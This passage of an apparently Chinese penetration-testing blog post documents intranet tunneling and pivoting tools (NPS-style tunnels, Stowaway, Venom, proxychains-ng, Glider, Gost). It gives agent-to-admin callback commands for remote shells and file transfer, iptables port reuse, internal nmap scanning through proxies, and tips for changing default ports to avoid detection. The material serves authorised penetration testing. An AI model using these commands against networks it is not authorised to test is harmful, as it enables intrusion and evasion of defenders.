class="number">.1</span>）,填写的监听端口(<span class="number">8001</span>)，相当于访问内网<span class="title function_">ip</span>(<span class="number">10.1</span><span class="number">.50</span><span class="number">.101</span>):目标端口(<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line">例如：ssh -p <span class="number">8001</span> root@<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>UDP隧道</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">适用范围： 内网dns解析等udp连接场景</span><br><span class="line">假设场景： 内网有一台dns（<span class="number">10.1</span><span class="number">.50</span><span class="number">.102</span>:<span class="number">53</span>），在非内网环境下想使用该dns，公网服务器为<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">在刚才创建的客户端的隧道管理中添加一条udp隧道，填写监听的端口（<span class="number">53</span>）、内网目标ip和目标端口（<span class="number">10.1</span><span class="number">.50</span><span class="number">.102</span>:<span class="number">53</span>），保存。</span><br><span class="line">修改需要使用的dns地址为<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>，则相当于使用<span class="number">10.1</span><span class="number">.50</span><span class="number">.102</span>作为dns服务器</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Scosk 5 代理隧道</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">适用范围： 在外网环境下如同使用vpn一样访问内网设备或者资源</span><br><span class="line">假设场景： 想将公网服务器<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>的<span class="number">8003</span>端口作为socks5代理，达到访问内网任意设备或者资源的效果</span><br><span class="line"></span><br><span class="line">在刚才创建的客户端隧道管理中添加一条socks5代理，填写监听的端口（<span class="number">8003</span>），保存。</span><br><span class="line">在外网环境的本机配置socks5代理，ip为公网服务器ip（<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>），端口为填写的监听端口(<span class="number">8003</span>)，即可访问内网。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Http 代理隧道</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">适用范围： 在外网环境下使用http正向代理访问内网站点</span><br><span class="line">假设场景： 想将公网服务器<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>的<span class="number">8004</span>端口作为http代理，访问内网网站</span><br><span class="line"></span><br><span class="line">在刚才创建的客户端隧道管理中添加一条http代理，填写监听的端口</span><br><span class="line">在外网环境的本机配置http代理，ip为公网服务器ip（<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>），端口为填写的监听端口(<span class="number">8004</span>)，即可访问内网</span><br></pre></td></tr></table></figure>

<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><aside>
🔑 配置文件详解，服务端

</aside>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">web_port 	web管理端口</span><br><span class="line">web_password 	web界面管理密码</span><br><span class="line">web_username 	web界面管理账号</span><br><span class="line">web_base_url 	web管理主路径,用于将web管理置于代理子路径后面</span><br><span class="line">bridge_port 	服务端客户端通信端口</span><br><span class="line">https_proxy_port 	域名代理https代理监听端口</span><br><span class="line">http_proxy_port 	域名代理http代理监听端口</span><br><span class="line">auth_key 	web api密钥</span><br><span class="line">bridge_type 	客户端与服务端连接方式kcp或tcp</span><br><span class="line">public_vkey 	客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</span><br><span class="line">ip_limit 	是否限制ip访问，<span class="literal">true</span>或<span class="literal">false</span>或忽略</span><br><span class="line">flow_store_interval 	服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</span><br><span class="line">log_level 	日志输出级别</span><br><span class="line">auth_crypt_key 	获取服务端authKey时的aes加密密钥，<span class="number">16</span>位</span><br><span class="line">p2p_ip 	服务端<span class="title class_">Ip</span>，使用p2p模式必填</span><br><span class="line">p2p_port 	p2p模式开启的udp端口</span><br><span class="line">pprof_ip 	debug pprof 服务端ip</span><br><span class="line">pprof_port 	debug pprof 端口</span><br><span class="line">disconnect_timeout 	客户端连接超时，单位 5s，默认值 <span class="number">60</span>，即 300s = 5mins</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试修改默认管理端口，登陆用户密码，管理路径，服务端客户端默认8024（特征），尝试修改为其他端口。尝试修改客户端服务端连接协议kcp,tcp,可选，某些情况可能绕过内网封锁。</li>
</ul>
<aside>
🔑 客户端配置文件

</aside>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8024</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">username=<span class="number">111</span></span><br><span class="line">password=<span class="number">222</span></span><br><span class="line">compress=<span class="literal">true</span></span><br><span class="line">crypt=<span class="literal">true</span></span><br><span class="line">rate_limit=<span class="number">10000</span></span><br><span class="line">flow_limit=<span class="number">100</span></span><br><span class="line">remark=test</span><br><span class="line">max_conn=<span class="number">10</span></span><br><span class="line">#pprof_addr=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9999</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>server_addr</td>
<td>服务端ip&#x2F;域名:port</td>
</tr>
<tr>
<td>conn_type</td>
<td>与服务端通信模式(tcp或kcp)</td>
</tr>
<tr>
<td>vkey</td>
<td>服务端配置文件中的密钥(非web)</td>
</tr>
<tr>
<td>username</td>
<td>socks5或http(s)密码保护用户名(可忽略)</td>
</tr>
<tr>
<td>password</td>
<td>socks5或http(s)密码保护密码(可忽略)</td>
</tr>
<tr>
<td>compress</td>
<td>是否压缩传输(true或false或忽略)</td>
</tr>
<tr>
<td>crypt</td>
<td>是否加密传输(true或false或忽略)</td>
</tr>
<tr>
<td>rate_limit</td>
<td>速度限制，可忽略</td>
</tr>
<tr>
<td>flow_limit</td>
<td>流量限制，可忽略</td>
</tr>
<tr>
<td>remark</td>
<td>客户端备注，可忽略</td>
</tr>
<tr>
<td>max_conn</td>
<td>最大连接数，可忽略</td>
</tr>
<tr>
<td>pprof_addr</td>
<td>debug pprof ip:port</td>
</tr>
</tbody></table>
<hr>
<h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><aside>
💩 Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具
官方地址：https://github.com/ph4ntonn/Stowaway

</aside>

<blockquote>
<p>功能特性</p>
</blockquote>
<ul>
<li>支持命令补全&#x2F;历史</li>
<li>一目了然的节点树管理</li>
<li>节点间正向&#x2F;反向连接</li>
<li>节点间支持重连</li>
<li>节点间可通过socks5&#x2F;http代理进行连接</li>
<li>节点间可通过ssh隧道连接</li>
<li>节点间流量可选择TCP&#x2F;HTTP</li>
<li>多级socks5流量代理转发,支持UDP&#x2F;TCP,IPV4&#x2F;IPV6</li>
<li>远程shell</li>
<li>上传及下载文件</li>
<li>端口本地&#x2F;远程映射</li>
<li>节点可端口复用</li>
<li>自由开关各类服务</li>
<li>节点间相互认证</li>
<li>节点间流量以AES-256-GCM进行加密</li>
<li>支持各类平台(Linux&#x2F;Mac&#x2F;Windows&#x2F;MIPS&#x2F;ARM)</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/ph4ntonn/Stowaway/releases  </span></span><br><span class="line">访问下载地址，下载和系统架构相同的版本</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">角色</span><br><span class="line">admin 渗透测试者使用的主控端</span><br><span class="line">agent 渗透测试者部署的被控端</span><br><span class="line"></span><br><span class="line">定义</span><br><span class="line">节点: 指admin || agent</span><br><span class="line">主动模式: 指当前操作的节点主动连接另一个节点</span><br><span class="line">被动模式: 指当前操作的节点监听某个端口，等待另一个节点连接</span><br><span class="line">上游: 指当前操作的节点与其父节点之间的流量</span><br><span class="line">下游：指当前操作的节点与其所有子节点之间的流量</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数详解</p>
</blockquote>
<ul>
<li>admin</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">参数:</span><br><span class="line">-l 被动模式下的监听地址[ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--socks5-proxy socks5代理服务器地址</span><br><span class="line">--socks5-proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--socks5-proxyp socks5代理服务器密码(可选)</span><br><span class="line">--http-proxy http代理服务器地址</span><br><span class="line">--down 下游协议类型,默认为裸<span class="variable constant_">TCP</span>流量,可选<span class="variable constant_">HTTP</span></span><br></pre></td></tr></table></figure>

<ul>
<li>agent</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">参数:</span><br><span class="line">-l 被动模式下的监听地址[ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--socks5-proxy socks5代理服务器地址</span><br><span class="line">--socks5-proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--socks5-proxyp socks5代理服务器密码(可选)</span><br><span class="line">--http-proxy http代理服务器地址</span><br><span class="line">--reconnect 重连时间间隔</span><br><span class="line">--rehost 端口复用时复用的<span class="variable constant_">IP</span>地址</span><br><span class="line">--report 端口复用时复用的端口号</span><br><span class="line">--up 上游协议类型,默认为裸<span class="variable constant_">TCP</span>流量,可选<span class="variable constant_">HTTP</span></span><br><span class="line">--down 下游协议类型,默认为裸<span class="variable constant_">TCP</span>流量,可选<span class="variable constant_">HTTP</span></span><br><span class="line">--cs 运行平台的shell编码类型，默认为utf-<span class="number">8</span>，可选gbk</span><br></pre></td></tr></table></figure>

<aside>
💩 -l -s -c  参数agent和admin功能一致，用法一致

<p>–socks5-proxy&#x2F;–socks5-proxyu&#x2F;–socks5-proxyp&#x2F;–http-proxy</p>
<ul>
<li><code>-socks5-proxy</code>代表socks5代理服务器地址，<code>-socks5-proxyu</code>以及<code>-socks5-proxyp</code>可选</li>
<li><code>-http-proxy</code>代表http代理服务器地址,与socks5使用方式相同</li>
</ul>
<p>–up&#x2F;–down<br>这两个参数admin&amp;&amp;agent用法一致，可用在主动&amp;&amp;被动模式下<br>注意一点，当你设置了某一节点上&#x2F;下游为TCP&#x2F;HTTP流量后，与其连接的父&#x2F;子节点的下&#x2F;上游流量必须设置为一致！！！</p>
</aside>

<blockquote>
<p>端口复用</p>
</blockquote>
<aside>
💩 SO_REUSEPORT和SO_REUSEADDR模式

<p><strong>主要支持windows、mac环境下的复用，linux亦可，但限制较多</strong></p>
<ul>
<li>admin端：<code>./stowaway_admin -c 192.168.0.105:80 -s 123</code></li>
<li>agent端： <code>./stowaway_agent --report 80 --rehost 192.168.0.105 -s 123</code></aside></li>
</ul>
<aside>
💩 IPTABLES模式，**仅支持linux环境下的复用，agent会自动修改IPTABLES，需要root权限**
agent端： `./stowaway_agent --report 22 -l 10000 -s 123`
指定复用端口22，连接端口10000

<p>在agent启动后，请使用<code>script</code>目录下的<code>reuse.py</code></p>
<p>先设置SECRET的值(SECRET的值就是在启动各个节点时所设置的通信密钥),</p>
<p>之后执行：<code>python reuse.py --start --rhost xxx.xxx.xxx.xxx --rport xxx</code></p>
<ul>
<li>-rhost代表agent的地址</li>
<li>-rport代表被复用的端口,在本例中应当为22</li>
</ul>
<p>此时admin端就可以连接：<code>./stowaway_admin -c 192.168.0.105:22 -s 123</code></p>
</aside>

<blockquote>
<p>使用流程</p>
</blockquote>
<aside>
💩 admin端
监听8234端口，不指定ip默认在0.0.0.0（即本机所有ip），指定加密密钥为passwdkey，协议指定http
sudo ./linux_x64_admin -l 8234 -s passwdkey --down http

<p>agent端<br>连接admin端ip,端口8234,指定密钥，重连时间10s,上游协议指定http,下游指定http,上游必须和admin端下游协议一样，不然连接不上。指定shell编码为utf-8,如果是windows指定为gbk。<br>sudo stowaway-agent -c adminip:8234 -s passwdkey –reconnect 10  –up http –down http –cs utf-8</p>
<p>help 命令解析<br>help 命令显示admin下的选项<br>• <code>detail</code>: 展示在线节点的详细信息<br>• <code>topo</code>: 展示在线节点的父子关系<br>• <code>use</code>: 使用某个agent<br>• <code>exit</code>: 退出stowaway</p>
<p>当用户使用<code>use</code>命令选择了一个agent后，进入第二层node panel，其包含的命令如下<br>use下help命令解析<br>• <code>listen</code>: 命令agent监听某个端口并等待子节点的连入</p>
<ol>
<li><code>Normal passive</code>: 此选项意味着agent将会以普通的方式监听在目标端口，并等待子节点连入</li>
<li><code>IPTables Reuse</code>：此选项意味着agent将会以IPTables Reuse的方式复用端口，并等待子节点连入</li>
<li><code>SOReuse</code>：此选项意味着agent将会以SOReuse的方式复用端口，并等待子节点连入</li>
</ol>
<p>• <code>ssh</code>: 命令节点以ssh方式连接目标机器<br>• <code>shell</code>: 获取当前节点的shell<br>• <code>socks</code>：在当前节点上启动socks5服务，<code>socks 7777 &lt;username&gt; &lt;password&gt;</code><br>• <code>stopsocks</code>: 停止在当前节点上的socks5服务<br>• <code>connect</code>: 命令当前节点连接至另一个子节点<br>• <code>sshtunnel</code>: 命令当前节点以ssh隧道的方式连接至另一个子节点<br>• <code>upload</code>: 向当前节点上传文件<br>• <code>download</code>: 下载当前节点上的文件<br>• <code>forward</code>: 映射admin上的端口至远程端口<br>• <code>stopforward</code>: 关闭当前节点的远程映射<br>• <code>backward</code>: 反向映射当前agent上的端口至admin的本地端口<br><code>stopbackward</code>: 关闭当前节点的反向映射<br>• <code>shutdown</code>: 命令当前节点下线<br>• <code>back</code>: 退回到主panel<br>• <code>exit</code>: 退出stowaway</p>
</aside>

<blockquote>
<p>多级网络</p>
</blockquote>
<ul>
<li>admin: <code>./stowaway_admin -l 9999 -s 123</code></li>
<li>agent-1:  <code>./stowaway_agent -c 127.0.0.1:9999 -s 123</code></li>
<li>agent-2:  <code>./stowaway_agent -l 10000 -s 123</code></li>
<li><code>use 0</code> -&gt; <code>connect agent-2的IP:10000</code></li>
</ul>
<hr>
<h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><aside>
💩 Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。

<p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p>
<p>渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。<br>地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p>
</aside>

<blockquote>
<p>特点</p>
</blockquote>
<ul>
<li>可视化网络拓扑</li>
<li>多级socks5代理</li>
<li>多级端口转发</li>
<li>端口复用 (apache&#x2F;mysql&#x2F;…)</li>
<li>ssh隧道</li>
<li>交互式shell</li>
<li>文件的上传和下载</li>
<li>节点间通信加密</li>
<li>跨平台(Linux&#x2F;Windows&#x2F;MacOS)和多种架构(x86&#x2F;x64&#x2F;arm&#x2F;mips)</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Dliv3/Venom/releases">https://github.com/Dliv3/Venom/releases</a>  下载对应系统版本安装</li>
</ul>
<blockquote>
<p>参数详解</p>
</blockquote>
<ul>
<li>admin</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Options</span>:</span><br><span class="line">  -lport port   监听一个本地端口</span><br><span class="line">  -passwd password  加密通信中使用的密码</span><br><span class="line">  -rhost ip  远程连接端 ip 地址</span><br><span class="line">  -rport port 远程连接端端口号</span><br></pre></td></tr></table></figure>

<ul>
<li>agent</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Options</span>:</span><br><span class="line">  -lhost ip 本地ip地址</span><br><span class="line">  -lport port 监听本地端口</span><br><span class="line">  -passwd password 加密通信中使用的密码</span><br><span class="line">  -reuse-port port 端口复用指定的端口号</span><br><span class="line">  -rhost ip 远程连接端的ip地址</span><br><span class="line">  -rport port  远程连接端的端口号</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用流程</p>
</blockquote>
<ul>
<li>sudo .&#x2F;admin_linux_x64 -lport 12131 -passwd passwdkey  管理端监听</li>
<li>sudo venom-agent -rhost “admin ip”  -rport 12131 -passwd passwdkey 客户端连接</li>
</ul>
<blockquote>
<p>admin help 参数</p>
</blockquote>
<ul>
<li>help                                           显示帮助信息</li>
<li>exit                                            退出</li>
<li>show                                         显示网络拓扑</li>
<li>getdes                                       查看目标节点描述.</li>
<li>setdes     [info]                          向目标节点添加说明.</li>
<li>goto       [id]                              通过 id 选择节点</li>
<li>listen     [lport]                           监听目标节点上的端口.</li>
<li>connect    [rhost] [rport]               通过目标节点连接到新节点.</li>
<li>sshconnect [user@ip:port] [dport]        通过ssh 隧道连接到新节点</li>
<li>shell                                                      在目标节点上启动shell.</li>
<li>upload     [local_file]  [remote_file]       上传文件.</li>
<li>download   [remote_file]  [local_file]     下载文件.</li>
<li>socks      [lport]                                     启动一个socks5隧道.</li>
<li>lforward   [lhost] [sport] [dport]        将本地端口转发到远程端口.</li>
<li>rforward   [rhost] [sport] [dport]       远程端口转发到本地端口.</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">show 显示节点信息</span><br><span class="line">随后 goto <span class="number">1</span> 选择<span class="number">1</span>节点</span><br><span class="line">listen <span class="number">12133</span> 在节点<span class="number">1</span>监听<span class="number">12133</span>端口</span><br><span class="line">随后 goto <span class="number">2</span> 选择<span class="number">2</span>节点</span><br><span class="line">connect <span class="number">192.168</span><span class="number">.228</span><span class="number">.10</span> <span class="number">12133</span>  随后节点<span class="number">2</span>连接到节点<span class="number">1</span>,节点<span class="number">1</span>成为子节点，或者 agent_linux_x64 -rhost <span class="number">192.168</span><span class="number">.204</span><span class="number">.139</span> -rport 进行连接</span><br><span class="line">sshconnect root@<span class="number">192.168</span><span class="number">.0</span><span class="number">.104</span>:<span class="number">22</span> <span class="number">9999</span>  监听端口后通过ssh隧道连接</span><br><span class="line">goto <span class="number">1</span> 节点后执行 shell 打开一个shell</span><br><span class="line">upload /tmp/test.<span class="property">pdf</span> /tmp/test2.<span class="property">pdf</span> 上传文件</span><br><span class="line">download /tmp/test2.<span class="property">pdf</span> /tmp/test3.<span class="property">pdf</span> 下载文件</span><br><span class="line">socks <span class="number">8090</span> 开启socks5隧道，admin端配置后可通过隧道访问内网agent</span><br><span class="line"></span><br><span class="line">lforward将admin节点本地的<span class="number">8888</span>端口转发到node1的<span class="number">8888</span>端口</span><br><span class="line">lforward <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8888</span> <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">rforward 将node1网段的<span class="number">192.168</span><span class="number">.204</span><span class="number">.103</span>端口<span class="number">8889</span>转发到admin节点本地的<span class="number">8889</span>端口</span><br><span class="line">rforward <span class="number">192.168</span><span class="number">.204</span><span class="number">.103</span> <span class="number">8889</span> <span class="number">8889</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h2><aside>
💩 通过此工具可以实现指定命令通过隧道连接访问网络

<p>ProxyChains 是一个 UNIX 程序，在动态链接程序中并通过 SOCKS4a&#x2F;5 或 HTTP 代理重定向连接。它仅支持 TCP（不支持 UDP&#x2F;ICMP 等）。</p>
</aside>

<blockquote>
<p><strong>使用场景</strong></p>
</blockquote>
<ul>
<li>命令行命令通过代理隧道转发流量，例如<code>proxychains curl [target.com](http://target.com)</code> <code>curl</code> 命令通过<code>proxychains</code> 配置的隧道进行连接。</li>
<li>内网渗透进行内网穿透后连接内网隧道进行测试。例如通过隧道扫描内网。</li>
</ul>
<blockquote>
<p><strong>安装</strong></p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/rofl0r/proxychains-ng/releases">https://github.com/rofl0r/proxychains-ng/releases</a></li>
<li>几乎所有的发行版仓库都存在这个包，直接使用包管理器进行安装即可</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">apt install proxychains-ng</span><br><span class="line">pacman -S proxychains-ng</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>配置文件</strong></p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">配置文件位置 /etc/proxychains.<span class="property">conf</span></span><br><span class="line"></span><br><span class="line">#dynamic_chain 动态链配置，根据列表中配置的服务器进行逐个连接，自动跳过失效的服务器，其中一个成功不再继续下一个。</span><br><span class="line">#strict_chain  静态链配置，根据列表中配置的服务器进行逐个连接，所有配置的服务器连接形成代理链，所有服务器都必须在线。</span><br><span class="line">#round_robin_chain 同strict_chain,但是会跳过失败服务器。</span><br><span class="line">#random_chain   随机选择服务器完成连接</span><br><span class="line">#chain_len = <span class="number">2</span>  选择连接几个服务器，只有当使用random_chain或round_robin_chain时才有意义</span><br><span class="line">#quiet_mode  安静模式，不显示库输出信息，推荐开启</span><br><span class="line"># proxy_dns 代理dns请求，proxychains官方模式，简单速度快，可能不兼容浏览器</span><br><span class="line"># proxy_dns_old 代理dns请求，模式二，速度慢，不支持，o nio n url，兼容性更好</span><br><span class="line">#proxy_dns_daemon <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1053</span>  代理dns请求，模式三，兼容性最好，类似模式一，需要首先通过 proxychains4-daemon 指定本地服务运行</span><br><span class="line"></span><br><span class="line">服务器配置格式</span><br><span class="line"></span><br><span class="line">#            	socks5	<span class="number">192.168</span><span class="number">.67</span><span class="number">.78</span>	<span class="number">1080</span>	lamer	secret</span><br><span class="line">#		          http	<span class="number">192.168</span><span class="number">.89</span><span class="number">.3</span>	<span class="number">8080</span>	justu	hidden</span><br><span class="line">#	 	          socks4	<span class="number">192.168</span><span class="number">.1</span><span class="number">.49</span>	<span class="number">1080</span></span><br><span class="line">#	            http	<span class="number">192.168</span><span class="number">.39</span><span class="number">.93</span>	<span class="number">8080</span>	</span><br><span class="line"></span><br><span class="line">[<span class="title class_">ProxyList</span>]  配置服务器</span><br><span class="line">socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> </span><br><span class="line">socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> user pass</span><br><span class="line">http <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span>  user pass</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用</p>
</blockquote>
<ul>
<li>proxychains curl <a target="_blank" rel="noopener external nofollow noreferrer" href="http://target.com/">target.com</a>   通过服务器转发 curl 的请求流量。</li>
<li>proxychains nmap 192.168.0.1&#x2F;24  通过配置的内网穿透隧道进行内网渗透扫描信息搜集</li>
<li>。。。</li>
</ul>
<hr>
<h2 id="Glider"><a href="#Glider" class="headerlink" title="Glider"></a>Glider</h2><aside>
📌 Glider是一个支持多种协议的转发代理，也是一个具有IPset管理功能（如DNSMASQ）的DNS/DHCP服务器。 
项目地址：https://github.com/nadoo/glider

</aside>

<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>快速隧道建立</li>
<li>快速代理链配置</li>
<li>同时支持多种协议代理链互联</li>
<li>DNS 代理</li>
<li>在同一端口上提供http和socks 5</li>
<li>支持广泛协议（几乎所有）</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li>Binary: <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/nadoo/glider/releases">https://github.com/nadoo/glider/releases</a></li>
<li>Docker: <code>docker pull nadoo/glider</code></li>
<li>Manjaro: <code>pamac install glider</code></li>
<li>ArchLinux: <code>sudo pacman -S glider</code></li>
<li>Homebrew: <code>brew install glider</code></li>
<li>MacPorts: <code>sudo port install glider</code></li>
<li>Source: <code>go install github.com/nadoo/glider@latest</code></li>
</ul>
<blockquote>
<p>使用</p>
</blockquote>
<ul>
<li><code>glider -verbose -listen :8443</code>  监听http 与 socks5 隧道到0.0.0.0:8443 端口</li>
<li><code>glider -listen socks5://:1080 -listen http://:8080 -verbose</code> 监听http隧道和socks5隧道</li>
<li><code>glider -listen :8443 -forward direct://#interface=eth0 -forward direct://#interface=eth1</code> 多个转发器：侦听8443，并在循环模式下通过接口eth0和eth1转发请求。</li>
<li><code>glider -listen http://:8080 -forward socks5://serverA:1080,socks5://serverB:1080</code>  监听8080端口，建立http隧道，通过forward设置的隧道链进行链接</li>
<li><code>glider -listen :8443 -forward socks5://serverA:1080 -forward socks5://serverB:1080#priority=10 -forward socks5://serverC:1080#priority=10</code>  设置转发器优先级，转发器优先级：只有当服务器B和服务器C不可用时，才会使用服务器A。</li>
<li><code>glider -verbose -listen :8443 -forward direct://#interface=eth0 -forward direct://#interface=eth1 -strategy rr</code> 对多个转发接口进行负载均衡</li>
<li><code>glider -verbose -listen :8443 -forward direct://#interface=eth0&amp;priority=100 -forward direct://#interface=eth1&amp;priority=200 -strategy ha</code>  或者高可用模式</li>
</ul>
<hr>
<h2 id="Gost-v3"><a href="#Gost-v3" class="headerlink" title="Gost v3"></a>Gost v3</h2><aside>
📖 用golang编写的简单隧道 ，GOST可以通过命令行参数直接开启一个或多个服务，无需额外的配置文件。
项目地址：https://github.com/go-gost/gost

</aside>

<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>端口转发</li>
<li>代理隧道</li>
<li>透明代理</li>
<li>DNS代理</li>
<li>ICMP隧道</li>
<li>内网穿透</li>
<li>TUN &#x2F; TAP</li>
</ul>
<blockquote>
<p>文档地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://latest.gost.run/">https://latest.gost.run</a></p>
</blockquote>
<blockquote>
<p>常用功能</p>
</blockquote>
<ul>
<li>iCMP 隧道</li>
</ul>
